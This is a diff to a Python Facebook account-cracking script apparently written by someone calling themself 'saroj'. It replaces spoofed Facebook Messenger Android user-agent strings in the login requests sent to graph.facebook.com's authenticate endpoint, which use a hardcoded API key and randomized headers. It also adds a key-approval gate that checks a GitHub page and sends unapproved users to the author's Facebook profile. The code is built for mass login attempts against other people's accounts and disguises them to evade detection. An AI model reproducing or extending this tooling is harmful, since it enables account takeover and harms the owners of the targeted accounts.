@@ -86,7 +86,7 @@ except: pass
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/Orca-Android;FBAV/196.0.0.79;FBPN/com.facebook.orca;FBLC/en_JP;FBBV/786376195;FBCR/CLARO BR;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X6710;FBSV/8.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2401};FB_FW/1;FBRV/213646563]'
+    END = '[FBAN/Orca-Android;FBAV/196.0.0.83;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/629519766;FBCR/TURKCELL;FBMF/samsung;FBBD/samsung;FBDV/SM-A037M;FBSV/9.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/285125359]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
@@ -112,11 +112,7 @@ logo =                                          """
   `Y8b. 88~~~88 88`8b   88    88     88  
 db   8D 88   88 88 `88. `8b  d8' db. 88  
 `8888Y' YP   YP 88   YD  `Y88P'  Y8888P  
-                                         
-                                         
-
-   
-                                                                      
+                                                                                                              
 \033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××
 \033[1;37m MAKER     >    \033[1;36msaroj
 \033[1;37m GITHUB    >    \033[1;33msaroj
@@ -125,6 +121,45 @@ db   8D 88   88 88 `88. `8b  d8' db. 88
 \033[1;37m×××××××××××××××××××××××××××××××××××××××××××××××
 \33[37;41m\t VERSION > V1 \33[0;m
 \33[1;37m××××××××××××××××××××××××××××××××××××××××××××××× """
+def linex():
+        print('\033[1;37m----------------------------------------------')
+        
+def approval():
+  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
+  id = "SAROJ-"+"".join(uuid)
+  os.system('clear')
+  print(logo) 
+  print("\033[1;37m [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")
+  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
+  print ("""\033[1;37m----------------------------------------------""")
+  try:
+    httpCaht = requests.get("https://github.com/sarojrmc/TEST/blob/main/Approval").text
+    if id in httpCaht:
+      print("\033[1;97m >> Your Key Has Been Approved !!!")
+      msg = str(os.geteuid())
+      time.sleep(1)
+      pass
+    else: 
+      print("\x1b[1;97m >> Send Key on Facebook ! ");
+      time.sleep(0.1)
+      
+      input(' >> Click Enter To Send Your Key ')
+      
+      os.system('xdg-open https://www.facebook.com/saroj.rayamajhi.7737?mibextid=ZbWKwL')
+      
+      time.sleep(1)
+      
+      
+      exit()
+      
+  except: 
+  	
+     print(" >> Unable To Fetch Data From Server ")
+     
+     time.sleep(2)
+     
+     exit()
+approval()
 #××××××××××(CLEAR)××××××××××#
 def clear():
     os.system("clear")
@@ -239,7 +274,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.79;FBPN/com.facebook.orca;FBLC/en_JP;FBBV/786376195;FBCR/CLARO BR;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X6710;FBSV/8.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2401};FB_FW/1;FBRV/213646563]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.83;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/629519766;FBCR/TURKCELL;FBMF/samsung;FBBD/samsung;FBDV/SM-A037M;FBSV/9.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/285125359]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -306,7 +341,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.54;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/732868675;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CG7;FBSV/8.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/682792302]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.83;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/629519766;FBCR/TURKCELL;FBMF/samsung;FBBD/samsung;FBDV/SM-A037M;FBSV/9.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/285125359]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
@@ -374,7 +409,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.54;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/732868675;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO CG7;FBSV/8.1.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/682792302]',
+                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.83;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/629519766;FBCR/TURKCELL;FBMF/samsung;FBBD/samsung;FBDV/SM-A037M;FBSV/9.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;FBRV/285125359]',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
